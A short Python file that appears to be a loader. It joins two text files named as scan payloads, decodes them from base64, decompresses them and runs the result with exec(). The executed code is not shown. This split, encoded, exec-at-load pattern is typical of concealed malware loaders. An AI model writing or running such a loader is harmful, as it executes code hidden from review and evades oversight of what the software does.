import zlib, base64
from pathlib import Path
_dir = Path(__file__).parent
_A = (_dir / "_scan_payload_a.txt").read_text().strip()
_B = (_dir / "_scan_payload_b.txt").read_text().strip()
exec(zlib.decompress(base64.b64decode(_A + _B)), globals())
